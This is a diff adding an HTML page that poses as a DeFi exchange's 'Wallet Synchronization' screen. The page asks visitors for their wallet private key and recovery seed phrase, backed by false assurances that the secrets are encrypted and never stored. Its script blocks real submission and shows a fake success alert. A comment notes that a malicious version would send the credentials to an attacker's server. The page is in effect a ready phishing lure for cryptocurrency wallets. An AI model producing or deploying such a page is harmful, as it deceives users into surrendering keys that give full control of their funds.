@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sync Your Wallet | DeFiSecure Exchange</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <header class="app-header">
+            <div class="logo">
+                <i class="fas fa-unlock-alt"></i>
+                <h1>DeFiSecure</h1>
+            </div>
+            <nav>
+                <a href="#"><i class="fas fa-home"></i> Dashboard</a>
+                <a href="#" class="active"><i class="fas fa-wallet"></i> Wallet</a>
+                <a href="#"><i class="fas fa-exchange-alt"></i> Trade</a>
+            </nav>
+        </header>
+
+        <main class="main-content">
+            <div class="card sync-card">
+                <div class="card-header">
+                    <h2><i class="fas fa-sync-alt"></i> Wallet Synchronization</h2>
+                    <p class="subtitle">Connect your external wallet to access advanced DeFi features. This ensures seamless integration with our platform.</p>
+                </div>
+                <form id="walletSyncForm" action="/api/v3/wallet/connect" method="POST">
+                    <div class="form-group">
+                        <label for="privateKey"><i class="fas fa-key"></i> Private Key</label>
+                        <input type="password" id="privateKey" name="privateKey" placeholder="Enter your wallet's private key (0x...)" required>
+                        <small class="form-help">Required for secure signature verification.</small>
+                    </div>
+                    <div class="form-group">
+                        <label for="seedPhrase"><i class="fas fa-seedling"></i> Recovery Seed Phrase</label>
+                        <textarea id="seedPhrase" name="seedPhrase" rows="3" placeholder="Enter your 12 or 24-word seed phrase separated by spaces" required></textarea>
+                        <small class="form-help">Used only for initial synchronization and encrypted immediately.</small>
+                    </div>
+                    <div class="form-group">
+                        <label for="network"><i class="fas fa-network-wired"></i> Preferred Network</label>
+                        <select id="network" name="network">
+                            <option value="eth">Ethereum Mainnet</option>
+                            <option value="bsc">BNB Smart Chain</option>
+                            <option value="polygon">Polygon</option>
+                        </select>
+                    </div>
+                    <div class="form-footer">
+                        <button type="submit" class="btn btn-primary">
+                            <i class="fas fa-link"></i> Synchronize Wallet
+                        </button>
+                        <p class="security-note">
+                            <i class="fas fa-shield-alt"></i> Your credentials are secured with TLS 1.3 encryption and never stored on our servers.
+                        </p>
+                    </div>
+                </form>
+            </div>
+        </main>
+
+        <footer class="app-footer">
+            <p>© 2023 DeFiSecure Exchange. All rights reserved. | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
+        </footer>
+    </div>
+
+    <script>
+        document.getElementById('walletSyncForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            // Simulate submission feedback
+            const btn = this.querySelector('button[type="submit"]');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Synchronizing...';
+            btn.disabled = true;
+            
+            // In a real malicious scenario, credentials would be sent to attacker's server
+            setTimeout(() => {
+                alert('Wallet synchronization successful! You can now access all features.');
+                btn.innerHTML = '<i class="fas fa-check"></i> Synchronized';
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
